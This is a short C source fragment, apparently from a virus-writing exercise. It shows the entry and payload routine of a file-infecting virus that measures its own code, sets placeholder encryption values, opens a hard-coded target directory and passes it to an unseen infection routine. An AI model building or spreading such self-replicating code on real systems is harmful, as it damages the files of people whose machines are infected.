#include "ft_virus.h"

void start(void)
{
	payload();
	EXIT(0);
}

void payload()
{
	t_data data;
	int fd;
	char hello[] = "\ndir: ";
	char payload_addr[] = "\npayload addr:";
	char infested_dir[] = INFESTED_DIR;
	u64  ret;

	fd = 0xdeadbeaf;
	ret = get_rel_addr();
	//ft_putul(ret);
	//WRITE(1, hello, sizeof(hello) - 1);
	//WRITE(1, infested_dir, sizeof(infested_dir) - 1);
	//WRITE(1, payload_addr, sizeof(payload_addr) - 1);
	//WRITE(1, ret - ((void*)&get_rel_addr - (void*)&payload), 60);
	//ft_putul(get_rel_addr() - ((void*)&get_rel_addr - (void*)&payload));
	//WRITE(1, payload_addr, 1);
	//ft_putnbr(&payload);
	data.infos.pl_size = &payload_end - &payload;
	ft_putnbr(&payload_end - &payload);
	ft_putchar('\n');
	data.key = 0xdeadbeaf;
	data.decrypt_start = 0xdeadbeaf;
	//mprotect_us();
	//decrypt();
	fd = OPEN(infested_dir, O_RDONLY | O_DIRECTORY);
	if (fd == -1)
		return ;
	finder(data, fd);
	CLOSE(fd);
}

void payload_end(void)
{
	;
}

